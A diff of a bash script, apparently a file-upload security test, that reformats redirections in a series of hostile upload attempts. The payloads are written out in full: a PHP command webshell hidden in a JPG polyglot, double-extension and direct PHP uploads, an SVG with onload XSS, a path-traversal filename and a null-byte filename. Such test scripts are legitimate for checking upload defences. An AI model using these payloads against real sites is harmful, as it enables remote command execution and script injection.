@@ -33,8 +33,8 @@ upload_file() {
 # --- 1. PHP webshell disguised as .jpg (polyglot) ---
 echo "[+] Upload 1: PHP webshell in .jpg polyglot"
 POLYGLOT="${TMPDIR}/evil.jpg"
-printf '\xFF\xD8\xFF\xE0' > "${POLYGLOT}"
-echo '<?php passthru($_GET["cmd"]); ?>' >> "${POLYGLOT}"
+printf '\xFF\xD8\xFF\xE0' >"${POLYGLOT}"
+echo '<?php passthru($_GET["cmd"]); ?>' >>"${POLYGLOT}"
 upload_file "${POLYGLOT}" "avatar.jpg" "PHP-in-JPG polyglot"
 
 echo ""
@@ -42,7 +42,7 @@ echo ""
 # --- 2. Double extension ---
 echo "[+] Upload 2: Double extension (.php.jpg)"
 DOUBLE_EXT="${TMPDIR}/shell.php.jpg"
-echo '<?php echo "pwned"; ?>' > "${DOUBLE_EXT}"
+echo '<?php echo "pwned"; ?>' >"${DOUBLE_EXT}"
 upload_file "${DOUBLE_EXT}" "shell.php.jpg" "double extension .php.jpg"
 
 echo ""
@@ -50,7 +50,7 @@ echo ""
 # --- 3. Pure PHP file ---
 echo "[+] Upload 3: Straight .php upload"
 PHP_FILE="${TMPDIR}/webshell.php"
-echo '<?php echo "test"; ?>' > "${PHP_FILE}"
+echo '<?php echo "test"; ?>' >"${PHP_FILE}"
 upload_file "${PHP_FILE}" "webshell.php" "direct .php upload"
 
 echo ""
@@ -66,7 +66,7 @@ echo ""
 # --- 5. SVG with embedded JavaScript ---
 echo "[+] Upload 5: SVG with embedded JS (XSS)"
 SVG_FILE="${TMPDIR}/evil.svg"
-cat > "${SVG_FILE}" <<'SVGEOF'
+cat >"${SVG_FILE}" <<'SVGEOF'
 <?xml version="1.0" encoding="UTF-8"?>
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
   <text x="0" y="20">SVG XSS</text>
@@ -79,7 +79,7 @@ echo ""
 # --- 6. HTML file with inline script ---
 echo "[+] Upload 6: HTML with inline script"
 HTML_FILE="${TMPDIR}/evil.html"
-echo '<html><body><h1>Test</h1></body></html>' > "${HTML_FILE}"
+echo '<html><body><h1>Test</h1></body></html>' >"${HTML_FILE}"
 upload_file "${HTML_FILE}" "page.html" "HTML file"
 
 echo ""
@@ -87,7 +87,7 @@ echo ""
 # --- 7. Path traversal in filename ---
 echo "[+] Upload 7: Path traversal in filename"
 TRAV_FILE="${TMPDIR}/trav.php"
-echo '<?php phpinfo(); ?>' > "${TRAV_FILE}"
+echo '<?php phpinfo(); ?>' >"${TRAV_FILE}"
 upload_file "${TRAV_FILE}" "../../shell.php" "path traversal ../../shell.php"
 
 echo ""
@@ -95,7 +95,7 @@ echo ""
 # --- 8. Null byte in filename ---
 echo "[+] Upload 8: Null byte injection in filename"
 NULL_FILE="${TMPDIR}/null.php"
-echo '<?php phpinfo(); ?>' > "${NULL_FILE}"
+echo '<?php phpinfo(); ?>' >"${NULL_FILE}"
 upload_file "${NULL_FILE}" "shell.php%00.jpg" "null byte shell.php%00.jpg"
 
 echo ""
